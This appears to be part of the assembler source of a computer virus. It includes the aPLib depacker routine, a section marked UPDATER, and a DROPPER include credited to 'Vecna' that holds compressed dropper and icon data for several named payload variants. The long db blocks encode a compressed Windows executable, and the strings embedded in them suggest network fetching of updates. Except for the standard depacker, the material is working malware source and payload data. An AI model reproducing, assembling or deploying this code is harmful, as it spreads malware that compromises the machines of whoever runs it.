db 08Ch, 011h, 00Bh, 0E8h, 061h, 013h, 07Bh, 00Fh
db 082h, 088h, 088h, 037h, 08Bh, 03Dh, 041h, 003h
db 0F8h, 089h, 0E1h, 054h, 048h, 093h, 036h, 0A9h
db 0C2h, 073h, 0C4h, 060h, 057h, 0AAh, 0F3h, 0B1h
db 02Ch, 0E7h, 080h, 04Dh, 072h, 05Dh, 081h, 039h
db 056h, 04Dh, 098h, 08Dh, 00Ah, 075h, 055h, 083h
db 079h, 096h, 01Eh, 077h, 043h, 00Fh, 0B7h, 041h
db 008h, 0D3h, 0E0h, 0B7h, 0D0h, 0F8h, 007h, 075h
db 043h, 000h, 08Bh, 079h, 014h, 003h, 0F9h, 068h
db 052h, 012h, 091h, 0E2h, 051h, 060h, 015h, 019h
db 0FCh, 0F6h, 068h, 016h, 00Ch, 042h, 06Ch, 026h
db 0D7h, 013h, 0CAh, 0ECh, 049h, 004h, 0F7h, 060h
db 038h, 061h, 028h, 0EBh, 086h, 09Dh, 070h, 0C0h
db 0ACh, 0C1h, 016h, 057h, 0E8h, 063h, 05Dh, 0E9h
db 059h, 08Eh, 00Bh, 0C6h, 04Dh, 0FDh, 020h, 012h
db 060h, 01Ch, 08Bh, 044h, 024h, 07Ah, 03Ah, 04Ch
db 028h, 028h, 0DDh, 032h, 051h, 050h, 098h, 058h
db 023h, 0E8h, 04Ah, 003h, 041h, 08Bh, 0C8h, 041h
db 075h, 00Eh, 0D7h, 0FCh, 015h, 02Dh, 030h, 033h
db 027h, 00Ah, 074h, 0D8h, 0F9h, 051h, 0B1h, 0C9h
db 085h, 056h, 01Ch, 061h, 0C2h, 085h, 028h, 02Eh
db 034h, 021h, 01Ch, 064h, 024h, 03Eh, 02Ah, 06Ah
db 0B2h, 0E8h, 002h, 071h, 0E8h, 092h, 006h, 051h
db 0A3h, 032h, 0CAh, 041h, 040h, 0F9h, 016h, 02Fh
db 0A0h, 09Ch, 0D2h, 0A9h, 024h, 014h, 015h, 0E1h
db 041h, 050h, 08Bh, 0F4h, 0F8h, 010h, 056h, 0A6h
db 052h, 061h, 0E2h, 023h, 083h, 0ECh, 0F0h, 022h
db 089h, 073h, 088h, 08Bh, 07Ch, 028h, 024h, 02Ch
db 0C5h, 042h, 010h, 012h, 080h, 002h, 062h, 0A0h
db 0A9h, 020h, 0B8h, 047h, 045h, 054h, 00Ah, 020h
db 0ABh, 08Bh, 074h, 08Dh, 00Ch, 0E8h, 0AFh, 01Fh
db 0BEh, 048h, 053h, 058h, 088h, 0A5h, 0B7h, 027h
db 01Fh, 028h, 09Ch, 086h, 0B8h, 00Dh, 00Ah, 004h
db 031h, 0ABh, 02Bh, 07Fh, 057h, 0FFh, 08Fh, 028h
db 030h, 0E8h, 0D2h, 041h, 023h, 072h, 071h, 08Bh
db 05Ch, 04Ch, 04Fh, 053h, 098h, 0F6h, 0A0h, 011h
db 060h, 003h, 04Dh, 0D8h, 059h, 030h, 0EDh, 06Dh
db 02Ch, 02Bh, 0DEh, 060h, 089h, 03Ah, 01Ch, 081h
db 03Eh, 048h, 071h, 054h, 03Ah, 050h, 075h, 080h
db 0B9h, 043h, 06Fh, 06Eh, 074h, 087h, 0D9h, 01Fh
db 0ACh, 03Ah, 0C3h, 003h, 017h, 039h, 05Eh, 0FFh
db 0A8h, 012h, 081h, 07Eh, 033h, 003h, 065h, 024h
db 02Dh, 0F3h, 009h, 007h, 012h, 007h, 054h, 079h
db 070h, 0CFh, 067h, 004h, 0E2h, 011h, 0E3h, 021h
db 046h, 094h, 01Ch, 0FCh, 069h, 00Ch, 075h, 0F6h
db 089h, 086h, 018h, 0AEh, 0C3h, 0FFh, 04Ah, 0EDh
db 00Ah, 0F8h, 0EBh, 011h, 013h, 062h, 0FAh, 001h
db 039h, 0F9h, 021h, 016h, 071h, 01Eh, 062h, 00Bh
db 004h, 003h, 0AAh, 0EBh, 0F8h, 0C1h, 099h, 03Eh
db 02Eh, 0E5h, 016h, 084h, 00Ah, 041h, 072h, 00Fh
db 002h, 07Ah, 077h, 00Ah, 001h, 05Ah, 076h, 007h
db 000h, 061h, 073h, 002h, 012h, 0F8h, 0B0h, 0F9h
db 042h, 0A4h, 0F1h, 0E8h, 0DBh, 090h, 0A5h, 003h
db 046h, 013h, 0EBh, 0F6h, 0BFh, 023h, 03Fh, 0A1h
db 084h, 04Eh, 0ABh, 0CAh, 004h, 006h, 006h, 04Fh
db 0E8h, 0BFh, 039h, 010h, 073h, 003h, 0A4h, 05Ch
db 03Ch, 07Eh, 0A0h, 07Eh, 03Bh, 035h, 044h, 054h
db 061h, 049h, 0C3h, 071h, 04Ch, 011h, 014h, 015h
db 064h, 077h, 04Ah, 04Fh, 0C5h, 08Bh, 041h, 024h
db 008h, 0EBh, 01Dh, 036h, 04Ah, 083h, 06Ah, 0F0h
db 058h, 0F8h, 003h, 040h, 028h, 073h, 08Bh, 005h
db 008h, 081h, 048h, 020h, 080h, 013h, 09Ah, 029h
db 035h, 0B0h, 074h, 036h, 002h, 08Bh, 00Dh, 060h
db 044h, 075h, 0E3h, 06Bh, 0FFh, 0D1h, 037h, 0A3h
db 048h, 013h, 041h, 074h, 066h, 0C7h, 063h, 0FDh
db 02Eh, 028h, 018h, 052h, 08Ah, 0D2h, 018h, 032h
db 0C2h, 070h, 0C6h, 00Fh, 031h, 074h, 047h, 0FCh
db 0BFh, 0A4h, 081h, 017h, 0F2h, 0AEh, 0FDh, 0B0h
db 05Ch, 080h, 00Ah, 0FCh, 08Bh, 047h, 002h, 00Dh
db 020h, 0C1h, 003h, 03Dh, 072h, 06Eh, 061h, 0C4h
db 074h, 013h, 0A7h, 033h, 0BFh, 0C4h, 0EBh, 052h
db 0CBh, 00Eh, 048h, 0AEh, 0D6h, 00Ah, 07Ah, 0FCh
db 0C4h, 01Eh, 0C3h, 0D4h, 05Ch, 006h, 04Ch, 09Bh
db 011h, 0D1h, 020h, 058h, 0DAh, 0C6h, 0E8h, 082h
db 03Bh, 0A4h, 011h, 011h, 02Eh, 068h, 0D6h, 03Bh
db 050h, 02Ah, 0FEh, 006h, 043h, 0EFh, 010h, 01Dh
db 021h, 088h, 00Ch, 064h, 02Ch, 020h, 0BFh, 0C3h
db 015h, 0C5h, 0C1h, 0D7h, 0A3h, 015h, 0F5h, 007h
db 023h, 068h, 011h, 06Ch, 088h, 070h, 0C4h, 074h
db 062h, 044h, 029h, 013h, 05Eh, 0D8h, 025h, 0E0h
db 030h, 0DDh, 023h, 095h, 0E4h, 006h, 021h, 0E8h
db 090h, 0ECh, 0C8h, 0F0h, 064h, 0F4h, 032h, 0F8h
db 019h, 0FCh, 00Dh, 0C1h, 031h, 008h, 004h, 086h
db 043h, 008h, 021h, 00Ch, 090h, 010h, 0C8h, 014h
db 064h, 018h, 032h, 020h, 019h, 024h, 00Ch, 028h
db 086h, 043h, 02Ch, 021h, 030h, 090h, 034h, 0C8h
db 038h, 064h, 03Ch, 032h, 044h, 019h, 04Ch, 00Ch
db 050h, 086h, 045h, 054h, 05Eh, 001h, 0FBh, 0C1h
db 02Fh, 076h, 065h, 063h, 061h, 021h, 082h, 00Ch
db 069h, 072h, 075h, 073h, 0E1h, 004h, 078h, 0CBh
db 087h, 060h, 06Fh, 06Bh, 034h, 065h, 0DFh, 02Ah
db 0FEh, 0AEh, 07Ah, 079h, 03Ch, 075h, 0C5h, 007h
db 06Ah, 070h, 0C7h, 0A5h, 0B0h, 066h, 074h, 077h
db 061h, 07Fh, 072h, 00Eh, 05Ch, 04Dh, 069h, 063h
db 0DFh, 01Bh, 073h, 01Dh, 0D3h, 057h, 0D1h, 06Eh
db 064h, 0E9h, 077h, 0EFh, 0C0h, 043h, 075h, 072h
db 0D7h, 030h, 00Dh, 090h, 056h, 062h, 0F1h, 069h
db 007h, 0F7h, 052h, 0FFh, 097h, 017h, 01Ch, 020h
db 0BAh, 02Fh, 031h, 02Eh, 0E5h, 070h, 08Fh, 055h
db 061h, 073h, 030h, 02Dh, 041h, 067h, 080h, 043h
db 03Ah, 020h, 04Dh, 06Fh, 07Ah, 069h, 071h, 06Ch
db 0C3h, 0D6h, 034h, 02Eh, 030h, 0E1h, 028h, 063h
db 0F4h, 06Dh, 070h, 0B0h, 096h, 007h, 069h, 062h
db 06Ch, 065h, 03Bh, 0D5h, 056h, 023h, 082h, 029h
db 0BEh, 05Ch, 078h, 041h, 0F3h, 0FDh, 070h, 08Fh
db 055h, 069h, 06Dh, 0F9h, 066h, 02Fh, 0CFh, 0B9h
db 066h, 02Ch, 04Ch, 00Bh, 078h, 072h, 02Dh, 07Eh
db 062h, 040h, 074h, 070h, 0ACh, 011h, 0A3h, 094h
db 0A7h, 06Ch, 018h, 02Ah, 0F1h, 0CBh, 028h, 06Ah
db 048h, 090h, 0DCh, 067h, 001h, 05Ch, 04Bh, 045h
db 052h, 04Eh, 0CCh, 04Ch, 033h, 03Ch, 032h, 02Eh
db 03Dh, 058h, 070h, 051h, 043h, 094h, 0B9h, 0BCh
db 09Ch, 054h, 06Fh, 04Fh, 06Ch, 068h, 03Ch, 0D9h
db 070h, 02Ah, 053h, 0BBh, 0C2h, 03Dh, 073h, 0FFh
db 0A1h, 0DEh, 050h, 046h, 0BFh, 0C8h, 0F5h, 0EFh
db 028h, 024h, 046h, 0F1h, 0EFh, 04Bh, 00Fh, 03Bh
db 04Eh, 054h, 0FBh, 047h, 0F7h, 0D2h, 082h, 0A5h
db 064h, 075h, 082h, 094h, 048h, 061h, 08Ch, 0DDh
db 00Ch, 041h, 0A2h, 011h, 08Fh, 022h, 03Fh, 07Fh
db 076h, 0DCh, 04Dh, 019h, 052h, 0EAh, 069h, 0A8h
db 06Ah, 0D2h, 069h, 053h, 006h, 00Dh, 030h, 070h
db 04Dh, 03Dh, 033h, 000h, 0FFh, 085h, 064h, 030h
db 028h, 00Ch, 05Ch, 040h, 031h, 0E0h, 0CAh, 021h
db 0A4h, 014h, 059h, 069h, 013h, 020h, 029h, 009h
db 0C8h, 014h, 064h, 075h, 048h, 044h, 090h, 0D0h
db 0F2h, 080h, 024h, 04Ch, 054h, 001h, 0B8h, 08Eh
db 0CCh, 031h, 0A4h, 009h, 0AEh, 089h, 0C4h, 012h
db 0D0h, 024h, 0E6h, 048h, 0FCh, 088h, 010h, 032h
db 011h, 01Eh, 022h, 02Eh, 044h, 03Eh, 04Ch, 089h
db 05Eh, 012h, 066h, 024h, 076h, 054h, 001h, 033h
db 084h, 011h, 08Eh, 022h, 009h, 096h, 044h, 09Eh
db 0ACh, 089h, 0BAh, 012h, 0CCh, 025h, 0D6h, 032h
db 024h, 0E4h, 099h, 008h, 0F4h, 011h, 006h, 033h
db 003h, 018h, 0A5h, 02Ah, 07Ch, 0A9h, 032h, 093h
db 0D3h, 01Ch, 04Dh, 078h, 002h, 057h, 053h, 04Fh
db 043h, 04Bh, 099h, 00Ch, 055h, 0F3h, 053h, 034h
db 00Bh, 00Eh, 041h, 044h, 056h, 065h, 050h, 049h
db 036h, 00Dh, 003h, 09Ah, 073h, 026h, 053h, 079h
db 065h, 089h, 06Dh, 044h, 08Bh, 0A1h, 00Fh, 018h
db 08Eh, 06Fh, 0BFh, 06Fh, 02Bh, 0FFh, 023h, 06Eh
db 045h, 078h, 066h, 01Eh, 015h, 053h, 040h, 098h
db 0BBh, 09Ah, 09Ch, 0EDh, 0DDh, 072h, 060h, 03Eh
db 075h, 0CBh, 050h, 073h, 0E4h, 01Eh, 00Ah, 043h
db 06Fh, 070h, 079h, 017h, 0A8h, 02Ch, 0C9h, 032h
db 074h, 091h, 09Ch, 066h, 098h, 021h, 053h, 04Dh
db 06Eh, 067h, 0D3h, 02Dh, 039h, 0DCh, 040h, 027h
db 04Eh, 061h, 06Dh, 0AAh, 02Bh, 065h, 0F2h, 0CAh
db 04Ch, 03Fh, 058h, 052h, 053h, 010h, 052h, 070h
db 01Bh, 045h, 072h, 09Ah, 09Eh, 04Fh, 0A3h, 00Fh
db 080h, 049h, 073h, 042h, 07Ah, 061h, 0A4h, 063h
db 0DAh, 0B8h, 021h, 08Dh, 097h, 016h, 063h, 009h
db 096h, 07Dh, 031h, 046h, 040h, 08Ch, 0B0h, 0D4h
db 0CAh, 011h, 056h, 0CFh, 007h, 074h, 075h, 061h
db 0D5h, 041h, 01Bh, 0E6h, 03Eh, 085h, 028h, 010h
db 046h, 0D4h, 050h, 057h, 033h, 073h, 02Ah, 06Bh
db 051h, 076h, 018h, 0B5h, 0F6h, 0F2h, 015h, 008h
db 0FDh, 028h, 076h, 008h, 0EDh, 049h, 08Eh, 05Dh
db 01Fh, 020h, 045h, 041h, 0A1h, 0D3h, 061h, 0B5h
db 075h, 0A6h, 026h, 00Eh, 0E3h, 015h, 04Ch, 061h
db 073h, 0A3h, 094h, 02Eh, 05Ch, 083h, 071h, 075h
db 065h, 0A6h, 02Ah, 0A2h, 0C9h, 0E3h, 005h, 0FDh
db 023h, 02Ah, 050h, 015h, 0CCh, 06Bh, 04Dh, 092h
db 05Ch, 03Ch, 056h, 0E4h, 059h, 0CAh, 054h, 0D9h
db 056h, 0A1h, 080h, 075h, 0E6h, 08Ah, 0C1h, 012h
db 0CBh, 0B1h, 035h, 04Bh, 0E5h, 079h, 0A9h, 027h
db 012h, 0A8h, 07Dh, 0D2h, 023h, 0DBh, 000h, 0EEh
db 060h, 000h
컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴[UPDATER.INC]컴�
컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴�[UNPACK.INC]컴�
;***************************************************************
;*         aPLib v0.22b  -  the smaller the better :)          *
;*               WASM & TASM assembler depacker                *
;*                                                             *
;*   Copyright (c) 1998-99 by  - Jibz -  All Rights Reserved   *
;***************************************************************

_aP_depack_asm:
    push   ebp
    mov    ebp, esp
    pushad
    push   ebp

    mov    esi, [ebp + 8]     ; C calling convention
    mov    edi, [ebp + 12]

    cld
    mov    dl, 80h

literal:
    movsb
nexttag:
    call   getbit
    jnc    literal

    xor    ecx, ecx
    call   getbit
    jnc    codepair
    xor    eax, eax
    call   getbit
    jnc    shortmatch
    mov    al, 10h
getmorebits:
    call   getbit
    adc    al, al
    jnc    getmorebits
    jnz    domatch_with_inc
    stosb
    jmp    short nexttag
codepair:
    call   getgamma_no_ecx
    dec    ecx
    loop   normalcodepair
    mov    eax,ebp
    call   getgamma
    jmp    short domatch

shortmatch:
    lodsb
    shr    eax, 1
    jz     donedepacking
    adc    ecx, 2
    mov    ebp, eax
    jmp    short domatch

normalcodepair:
    xchg   eax, ecx
    dec    eax
    shl    eax, 8
    lodsb
    mov    ebp, eax
    call   getgamma
    cmp    eax, 32000
    jae    domatch_with_2inc
    cmp    eax, 1280
    jae    domatch_with_inc
    cmp    eax, 7fh
    ja     domatch

domatch_with_2inc:
    inc    ecx

domatch_with_inc:
    inc    ecx
domatch:
    push   esi
    mov    esi, edi
    sub    esi, eax
    rep    movsb
    pop    esi
    jmp    short nexttag

getbit:
    add     dl, dl
    jnz     stillbitsleft
    mov     dl, [esi]
    inc     esi
    adc     dl, dl
stillbitsleft:
    ret

getgamma:
    xor    ecx, ecx
getgamma_no_ecx:
    inc    ecx
getgammaloop:
    call   getbit
    adc    ecx, ecx
    call   getbit
    jc     getgammaloop
    ret

donedepacking:
    pop    ebp
    sub    edi, [ebp + 12]
    mov    [ebp - 4], edi     ; return unpacked length in eax

    popad
    pop    ebp
    ret    4*2
컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴�[UNPACK.INC]컴�
컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴[DROPPER.INC]컴�
;Compressed Dropper&Icon data
;(C) Vecna

dropper   equ 0
coelho    equ dropper+6144    
hallwen   equ coelho+1152     
jesus     equ hallwen+1152    
ovo       equ jesus+1152      
santa     equ ovo+1152        
babylonia equ santa+1152      

icon      equ 12c8h

db 04Dh, 038h, 05Ah, 090h, 038h, 003h, 066h, 002h
db 004h, 009h, 071h, 0FFh, 081h, 0B8h, 0C2h, 091h
db 001h, 040h, 0C2h, 015h, 0C6h, 0C0h, 009h, 00Eh
db 0B4h, 04Ch, 0CDh, 021h, 015h, 001h, 0FAh, 0C6h
db 050h, 045h, 008h, 028h, 04Ch, 001h, 0BEh, 00Ah
db 0B0h, 0A2h, 00Ch, 038h, 014h, 0C7h, 0E0h, 001h
db 00Fh, 001h, 00Bh, 0C8h, 005h, 00Ch, 0E0h, 002h
db 0CAh, 01Bh, 012h, 015h, 065h, 010h, 032h, 004h
db 020h, 0BAh, 0DEh, 08Ch, 00Ch, 041h, 004h, 0A6h
db 01Fh, 0F1h, 05Dh, 051h, 04Ah, 00Dh, 02Bh, 002h
db 039h, 039h, 0D3h, 008h, 09Ah, 00Fh, 09Eh, 080h
db 065h, 05Ch, 0A1h, 050h, 031h, 053h, 060h, 009h
db 04Bh, 0D9h, 0BDh, 095h, 0B1h, 05Ch, 01Fh, 0ACh
db 02Eh, 01Ch, 074h, 065h, 078h, 0E2h, 038h, 0D6h
db 001h, 052h, 0CCh, 0D4h, 0C5h, 057h, 043h, 0C0h
db 060h, 02Eh, 072h, 064h, 061h, 072h, 074h, 080h
db 06Ah, 002h, 0AEh, 0FCh, 0A1h, 024h, 006h, 05Ah
db 028h, 055h, 0BBh, 0CDh, 02Eh, 049h, 027h, 0C1h
db 0A1h, 032h, 00Dh, 029h, 030h, 028h, 090h, 00Ah
db 0ACh, 0C0h, 0CEh, 0A0h, 073h, 04Eh, 063h, 015h
db 0ECh, 0CAh, 040h, 024h, 065h, 00Eh, 02Ah, 028h
db 070h, 0ADh, 001h, 0D7h, 061h, 0FCh, 0E8h, 0A0h
db 034h, 042h, 066h, 000h, 0BBh, 0C6h, 0CAh, 00Fh
db 0BAh, 0E0h, 01Fh, 073h, 060h, 004h, 014h, 0B1h
db 0ABh, 064h, 067h, 026h, 08Bh, 00Eh, 02Bh, 001h
db 0E3h, 002h, 0FFh, 0E1h, 0BEh, 031h, 00Bh, 020h
db 0CDh, 0B9h, 044h, 059h, 0F6h, 000h, 016h, 0ACh
db 0E2h, 0FBh, 0F7h, 0D3h, 066h, 089h, 031h, 01Dh
db 024h, 027h, 068h, 059h, 043h, 005h, 004h, 01Ah
db 075h, 0E8h, 04Fh, 00Ah, 093h, 00Ah, 0F9h, 05Dh
db 031h, 0BFh, 028h, 0ABh, 04Ch, 00Ah, 091h, 054h
db 07Fh, 070h, 095h, 0A7h, 01Eh, 090h, 03Ah, 0B2h
db 036h, 011h, 077h, 009h, 047h, 04Bh, 0F4h, 027h
db 027h, 0BCh, 01Fh, 06Ah, 076h, 010h, 0A3h, 074h
db 0DBh, 00Dh, 07Ch, 00Bh, 0C8h, 026h, 0CDh, 0BEh
db 028h, 0F4h, 01Dh, 075h, 00Bh, 087h, 011h, 01Ch
db 088h, 0B0h, 0B2h, 00Fh, 0B5h, 031h, 09Ch, 00Dh
db 091h, 013h, 09Fh, 0D5h, 00Dh, 023h, 0ECh, 0BCh
db 0ABh, 0D7h, 016h, 0BDh, 0B0h, 0D2h, 017h, 055h
db 08Bh, 0ECh, 003h, 083h, 0C4h, 0FCh, 068h, 061h
db 032h, 022h, 09Fh, 053h, 030h, 0E8h, 07Bh, 02Bh
db 089h, 045h, 0FCh, 0FEh, 074h, 011h, 023h, 068h
db 08Dh, 01Ah, 0E8h, 07Dh, 0F5h, 0A2h, 01Fh, 0FFh
db 075h, 041h, 024h, 064h, 08Fh, 01Bh, 085h, 0C0h
db 02Ah, 0E5h, 00Ch, 011h, 04Ch, 014h, 0C9h, 0C3h
db 04Bh, 0CAh, 07Bh, 06Ch, 071h, 014h, 04Eh, 00Dh
db 022h, 001h, 006h, 0CCh, 0FFh, 025h, 054h, 020h
db 085h, 0ECh, 050h, 0A9h, 006h, 04Ch, 00Ch, 048h
db 086h, 043h, 044h, 021h, 018h, 090h, 01Ch, 0DEh
db 0E1h, 090h, 024h, 0C8h, 028h, 064h, 014h, 032h
db 02Ch, 019h, 030h, 00Ch, 034h, 086h, 043h, 038h
db 021h, 03Ch, 090h, 00Ch, 0C8h, 008h, 064h, 004h
db 037h, 008h, 0A9h, 001h, 0D4h, 032h, 054h, 022h
db 008h, 046h, 024h, 036h, 048h, 02Ah, 0A8h, 001h
db 04Ah, 0AAh, 00Ch, 0D2h, 056h, 009h, 064h, 089h
db 070h, 012h, 082h, 024h, 092h, 048h, 0C0h, 091h
db 0D6h, 022h, 0E4h, 044h, 0FCh, 014h, 0A6h, 030h
db 044h, 03Eh, 030h, 089h, 028h, 012h, 01Ch, 024h
db 008h, 0B6h, 012h, 010h, 0F0h, 020h, 0E3h, 04Ah
db 032h, 029h, 044h, 021h, 0C0h, 096h, 014h, 066h
db 01Ch, 081h, 014h, 021h, 052h, 0ACh, 014h, 0C8h
db 060h, 0A8h, 0C2h, 0AFh, 0ACh, 05Ch, 050h, 0A0h
db 09Eh, 072h, 003h, 061h, 077h, 041h, 06Eh, 069h
db 06Dh, 0B0h, 074h, 065h, 064h, 073h, 052h, 076h
db 063h, 070h, 073h, 054h, 0A8h, 014h, 049h, 0F6h
db 06Fh, 067h, 06Eh, 040h, 0FBh, 001h, 047h, 065h
db 074h, 0FDh, 043h, 0C0h, 0BBh, 001h, 078h, 04Dh
db 071h, 073h, 03Eh, 061h, 067h, 084h, 042h, 06Fh
db 078h, 041h, 087h, 06Eh, 0ECh, 054h, 06Ch, 0F7h
db 0F9h, 073h, 0FBh, 00Fh, 035h, 055h, 053h, 045h
db 0A0h, 033h, 032h, 02Eh, 064h, 06Ch, 0E3h, 09Ch
db 05Ch, 075h, 03Eh, 000h, 078h, 069h, 074h, 050h
db 072h, 06Fh, 063h, 0DCh, 05Bh, 014h, 088h, 0B6h
db 07Dh, 00Fh, 06Eh, 064h, 043h, 06Ch, 0DBh, 050h
db 082h, 08Ch, 0ACh, 00Ch, 008h, 072h, 0F8h, 074h
db 0DBh, 00Ah, 076h, 070h, 086h, 054h, 091h, 012h
db 04Eh, 0F6h, 078h, 0A6h, 011h, 050h, 0E1h, 06Ah
db 043h, 038h, 075h, 072h, 0FCh, 06Dh, 06Eh, 0E2h
db 050h, 053h, 08Ah, 06Fh, 0E3h, 079h, 035h, 051h
db 0F9h, 031h, 027h, 023h, 06Eh, 0EEh, 072h, 0E5h
db 062h, 075h, 00Ch, 0A7h, 073h, 02Dh, 044h, 044h
db 001h, 053h, 06Fh, 079h, 09Ch, 0CAh, 06Dh, 02Dh
db 059h, 05Fh, 043h, 016h, 056h, 0F6h, 0CAh, 052h
db 069h, 0BCh, 028h, 064h, 00Eh, 06Fh, 057h, 0CBh
db 0A5h, 077h, 073h, 038h, 052h, 03Eh, 029h, 002h
db 053h, 06Ah, 079h, 073h, 0B7h, 030h, 0CCh, 0E7h
db 070h, 005h, 04Bh, 00Eh, 0D1h, 04Eh, 06Ah, 04Ch
db 0D4h, 051h, 018h, 040h, 046h, 050h, 069h, 078h
db 0EBh, 09Fh, 019h, 053h, 03Ch, 0F6h, 01Bh, 061h
db 079h, 04Dh, 020h, 0ADh, 024h, 091h, 096h, 082h
db 020h, 078h, 06Fh, 03Dh, 079h, 042h, 03Fh, 07Ah
db 06Ch, 0E8h, 01Ch, 099h, 0FCh, 053h, 0AEh, 02Ah
db 015h, 047h, 044h, 049h, 041h, 095h, 001h, 0AEh
db 0BCh, 0B3h, 001h, 090h, 09Eh, 09Bh, 09Ah, 08Dh
db 0DFh, 0BAh, 0CFh, 0A7h, 09Eh, 0C1h, 0FFh, 0BEh
db 0AFh, 0B6h, 0E9h, 091h, 0E1h, 08Bh, 0F9h, 099h
db 0F1h, 08Ah, 0DCh, 09Bh, 0DEh, 0FEh, 0A8h, 06Fh
db 096h, 00Ch, 0C7h, 088h, 08Ch, 0FDh, 04Ch, 0CCh
db 08Dh, 09Ah, 03Fh, 08Eh, 08Ah, 06Ch, 00Ah, 02Ah
db 0F2h, 01Eh, 0F5h, 0ABh, 097h, 073h, 026h, 08Fh
db 03Fh, 05Eh, 098h, 09Eh, 09Eh, 092h, 01Fh, 088h
db 01Ch, 093h, 07Eh, 09Eh, 09Dh, 09Ah, 01Bh, 08Bh
db 088h, 0EEh, 05Ch, 060h, 09Eh, 00Eh, 09Bh, 0D1h
db 0FFh, 0D5h, 0E6h, 0BAh, 072h, 0A7h, 0EDh, 0C2h
db 0BDh, 001h, 0F5h, 0C7h, 002h, 004h, 003h, 0E3h
db 07Fh, 011h, 080h, 00Eh, 035h, 038h, 011h, 068h
db 020h, 001h, 0E1h, 0CAh, 025h, 050h, 02Bh, 018h
db 05Ah, 04Ah, 0A4h, 068h, 018h, 056h, 02Bh, 009h
db 004h, 015h, 0EAh, 018h, 0E4h, 090h, 044h, 0A0h
db 040h, 005h, 0A8h, 008h, 028h, 01Ah, 048h, 065h
db 049h, 008h, 014h, 02Ch, 02Ah, 028h, 09Eh, 00Fh
db 0C5h, 040h, 054h, 036h, 029h, 085h, 080h, 004h
db 03Dh, 04Bh, 04Bh, 001h, 029h, 080h, 06Dh, 03Bh
db 0F8h, 0A4h, 007h, 0A3h, 002h, 036h, 013h, 0C0h
db 002h, 008h, 040h, 0DCh, 0F0h, 02Dh, 0CAh, 0A6h
db 00Eh, 093h, 03Ch, 019h, 099h, 009h, 066h, 012h
db 033h, 02Fh, 0E8h, 0CCh, 039h, 0C4h, 099h, 089h
db 066h, 012h, 033h, 02Eh, 011h, 07Eh, 06Eh, 099h
db 031h, 091h, 078h, 08Bh, 0E4h, 05Fh, 022h, 0FBh
db 017h, 0D8h, 0BAh, 045h, 0E2h, 02Fh, 091h, 07Ch
db 08Bh, 0E4h, 05Eh, 062h, 0FBh, 017h, 088h, 0BEh
db 045h, 0F2h, 02Ah, 014h, 038h, 045h, 0C2h, 02Eh
db 011h, 06Ch, 009h, 0E6h, 0CCh, 0DDh, 0BFh, 036h
db 097h, 008h, 047h, 066h, 022h, 033h, 0E1h, 016h
db 006h, 0DFh, 039h, 0E2h, 0FFh, 016h, 009h, 045h
db 033h, 0C2h, 02Ah, 08Ch, 03Eh, 0C5h, 0F6h, 02Fh
db 0B1h, 07Ch, 08Bh, 0F4h, 05Fh, 022h, 0F9h, 017h
db 0C8h, 0BEh, 045h, 0F2h, 02Fh, 0D1h, 07Ch, 08Bh
db 0E4h, 05Fh, 022h, 0F9h, 017h, 0C8h, 0BFh, 045h
db 049h, 08Ah, 0F2h, 0A6h, 002h, 099h, 009h, 044h
db 066h, 033h, 08Bh, 084h, 054h, 094h, 022h, 099h
db 0E9h, 017h, 088h, 0B2h, 008h, 033h, 02Eh, 011h
db 051h, 090h, 0F2h, 02Fh, 091h, 07Ch, 08Bh, 0E4h
db 05Fh, 022h, 0FDh, 017h, 0C8h, 0BEh, 045h, 0F2h
db 02Fh, 0B1h, 07Dh, 08Bh, 0F4h, 05Fh, 062h, 0FBh
db 017h, 0D8h, 0BEh, 045h, 0F2h, 02Fh, 0D1h, 07Ch
db 08Bh, 0E4h, 05Fh, 022h, 0F9h, 017h, 0C8h, 0B5h
db 031h, 037h, 08Ah, 0CAh, 002h, 099h, 066h, 009h
db 033h, 017h, 008h, 0A8h, 090h, 0FDh, 017h, 048h
db 0BCh, 045h, 0F2h, 02Fh, 091h, 07Ch, 08Bh, 0F4h
db 05Fh, 022h, 0F9h, 017h, 0C8h, 0BEh, 045h, 0F2h
db 02Fh, 0D1h, 07Ch, 08Bh, 0E4h, 05Fh, 022h, 0F9h
db 017h, 0C8h, 0BFh, 045h, 0F2h, 02Fh, 091h, 07Dh
db 08Bh, 0ECh, 05Fh, 062h, 0FDh, 017h, 0D8h, 0BEh
db 0C5h, 0F2h, 02Fh, 091h, 07Ch, 091h, 0A6h, 094h
db 0CCh, 08Ah, 0DFh, 02Ah, 002h, 06Eh, 033h, 009h
db 011h, 051h, 090h, 0EAh, 02Fh, 0D1h, 078h, 08Bh
db 0E4h, 05Fh, 022h, 0F9h, 017h, 0C8h, 0BFh, 045h
db 0F2h, 02Fh, 091h, 07Ch, 08Bh, 0E4h, 05Fh, 022h
db 0FDh, 017h, 0C8h, 0BEh, 045h, 0F2h, 02Fh, 091h
db 07Ch, 08Bh, 0F4h, 05Fh, 022h, 0F9h, 017h, 0C8h
db 0BEh, 045h, 0F2h, 02Fh, 0D1h, 07Ch, 08Bh, 0ECh
db 05Fh, 062h, 0FBh, 033h, 032h, 024h, 0CCh, 016h
db 06Fh, 0B4h, 08Eh, 0D4h, 002h, 070h, 0A2h, 014h
db 06Ch, 08Bh, 0E1h, 014h, 0C9h, 063h, 0A6h, 050h
db 027h, 0CEh, 011h, 069h, 028h, 033h, 0EBh, 084h
db 05Ah, 030h, 04Ch, 0AFh, 0E1h, 016h, 030h, 093h
db 073h, 038h, 045h, 0A4h, 030h, 037h, 0CEh, 011h
db 06Ah, 030h, 0E3h, 0CAh, 0FFh, 04Dh, 030h, 059h
db 0BFh, 0C2h, 02Dh, 026h, 059h, 083h, 0C2h, 02Dh
db 028h, 049h, 037h, 0C2h, 02Ah, 082h, 06Ch, 002h
db 0DDh, 0C8h, 009h, 0BBh, 091h, 0AAh, 022h, 088h
db 044h, 077h, 055h, 089h, 044h, 012h, 022h, 095h
db 01Fh, 04Dh, 002h, 0B6h, 01Eh, 002h, 02Eh, 0D5h
db 002h, 004h, 036h, 044h, 002h, 02Eh, 0DCh, 002h
db 010h, 011h, 057h, 02Bh, 096h, 00Ah, 0B4h, 0FBh
db 0E1h, 00Eh, 0A4h, 0A0h, 03Ch, 016h, 080h, 027h
